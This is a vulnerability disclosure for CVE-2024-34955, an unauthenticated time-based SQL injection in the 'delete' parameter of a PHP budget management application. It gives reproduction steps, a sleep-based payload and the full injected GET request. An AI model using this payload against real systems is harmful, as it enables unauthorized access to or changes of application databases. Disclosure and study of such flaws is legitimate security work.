# Budget Management  - Unauthenticated SQL Injection
+ *Exploit Title:* Budget Management   - Unauthenticated SQL Injection - delete parameter
+ *Date:* 2024-05-05
+ *Exploit Author:* Asif Nawaz Minhas
+ *Vendor Homepage:* https://code-projects.org/budget-management-in-php-with-source-code/
+ *Software Link:* https://download.code-projects.org/details/1c10fce2-3260-479b-878f-b2107dec72f9
+ *Version:* 1.0
+ *Tested on:* Kali Linux + PHP 8.2.12, Apache 2.4.58
+ *CVE:* CVE-2024-34955 

## Description:
Budget Management is vulnerable to a unauthenticated SQL injection vulnerability.
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to http://localhost/PHP-Budget-Calculator/index.php
+ Add in Budget Title b2 and in Amount 111 and then click on the button Save.
+ Click now on the button delete and intercept this request
+ Add this payload: (select*from(select(sleep(12)))a)
+ The full GET reqeust becomes now like this: GET /PHP-Budget-Calculator/process.php?delete=(select*from(select(sleep(12)))a)
+ Click now on the button Forward.
+ Now you will see a time delay of 12 seconds, thus confirming the unauthenticated time based sql injection.




![SQLi](https://github.com/ethicalhackerNL/CVEs/blob/931ee2513e921398ebd038a312e13c491ea90e9f/Budget%20Management/print5.png )

![SQLi](https://github.com/ethicalhackerNL/CVEs/blob/931ee2513e921398ebd038a312e13c491ea90e9f/Budget%20Management/print4.png)


